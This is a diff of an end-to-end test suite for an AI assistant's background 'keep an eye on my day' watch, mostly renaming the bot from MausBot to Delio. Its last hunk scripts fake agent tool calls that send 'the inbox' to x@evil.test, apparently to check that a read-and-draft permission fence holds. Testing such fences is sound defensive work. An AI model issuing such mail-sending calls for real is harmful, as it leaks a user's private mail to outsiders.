@@ -4,11 +4,11 @@ import { tmpdir } from "node:os";
 import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 
 import { widgetActions, type WidgetRoot } from "../shared/widget.ts";
-import { launchVerificationServer } from "../scripts/control-omb.ts";
+import { launchVerificationServer } from "../scripts/control-odb.ts";
 import { startFakeConnectedApps, type FakeConnectedApps } from "./testing/fake-connected-apps.ts";
 
 // The proactive main agent end to end on a real server (temporary home, the fake Claude CLI) against a stand-in for the
-// connected-apps service: MausBot's default watch, its checks, the one batched run, the brief, Dismiss, presence and
+// connected-apps service: Delio's default watch, its checks, the one batched run, the brief, Dismiss, presence and
 // the read-and-draft fence. Nothing here reaches a real Google account or a model.
 const MINUTE = 60_000;
 // The brief lists only the person's meetings today. Their zone is one where it is midday when the suite starts, so the
@@ -47,19 +47,19 @@ function inbox(apps: FakeConnectedApps, now: number) {
   }];
 }
 
-describe("MausBot keeps an eye on the day, hidden from the sidebar", () => {
+describe("Delio keeps an eye on the day, hidden from the sidebar", () => {
   let apps: FakeConnectedApps;
   let fixture: Fixture;
   let api: ReturnType<typeof client>;
   let chief: { id: string; threadId: string };
   let watch: { id: string };
-  const markers = join(tmpdir(), `omb-watch-markers-${process.pid}-${Date.now()}.json`);
+  const markers = join(tmpdir(), `odb-watch-markers-${process.pid}-${Date.now()}.json`);
 
   beforeAll(async () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     writeFileSync(markers, JSON.stringify({ "Your checks found what is below": WATCH_REPLY }));
-    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
+    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, ODB_COMPOSIO_BROKER_URL: apps.url, ODB_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
     api = client(fixture);
     const bots = (await api("GET", "/api/bots")).bots as any[];
     const found = bots.find((bot) => bot.defaultBot && !bot.defaultBot.person);
@@ -83,7 +83,7 @@ describe("MausBot keeps an eye on the day, hidden from the sidebar", () => {
     return (await runs()).find((run) => run.id === id);
   };
 
-  it("a personal install's MausBot has the one default watch: checks, reads and drafts only, delivered to the brief", async () => {
+  it("a personal install's Delio has the one default watch: checks, reads and drafts only, delivered to the brief", async () => {
     expect((await api("GET", "/api/routines")).routines.filter((routine: any) => routine.deliver === "brief")).toHaveLength(1);
     expect(watch).toMatchObject({ name: "Keep an eye on my day", enabled: true, checks: ["calendar", "mail", "runs"], access: "read-and-draft", deliver: "brief",
       schedule: { type: "interval", everyMinutes: 15 } });
@@ -133,7 +133,7 @@ describe("MausBot keeps an eye on the day, hidden from the sidebar", () => {
     expect(widgetActions(card.widget.root as WidgetRoot).map((entry) => entry.label)).toEqual(expect.arrayContaining(["Draft a reply to Ada", "Dismiss Ada's email", "Join"]));
     expect(rows.some((message) => message.automation?.runId === run.id)).toBe(false);
     const told = (await api("GET", "/api/notifications")).notifications as any[];
-    expect(told.findLast((entry) => entry.kind === "brief"), "the notification opens MausBot's chat").toMatchObject({ botId: chief.id, threadId: chief.threadId });
+    expect(told.findLast((entry) => entry.kind === "brief"), "the notification opens Delio's chat").toMatchObject({ botId: chief.id, threadId: chief.threadId });
   });
 
   it("the same mail again is nothing new: no second turn", async () => {
@@ -199,7 +199,7 @@ describe("a read-and-draft run", () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     const multi = (slug: string, args: Record<string, unknown>) => ({ name: "COMPOSIO_MULTI_EXECUTE_TOOL", server: "composio", input: { tools: [{ tool_slug: slug, arguments: args }] } });
-    fixture = await launchVerificationServer({ ...process.env, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token,
+    fixture = await launchVerificationServer({ ...process.env, ODB_COMPOSIO_BROKER_URL: apps.url, ODB_COMPOSIO_BROKER_TOKEN: apps.token,
       FAKE_CLAUDE_TOOL_CALLS: JSON.stringify([
         multi("GMAIL_SEND_EMAIL", { recipient_email: "x@evil.test", body: "the inbox" }),
         multi("GMAIL_CREATE_EMAIL_DRAFT", { thread_id: "thread-important", recipient_email: "x@evil.test", body: "the inbox" }),
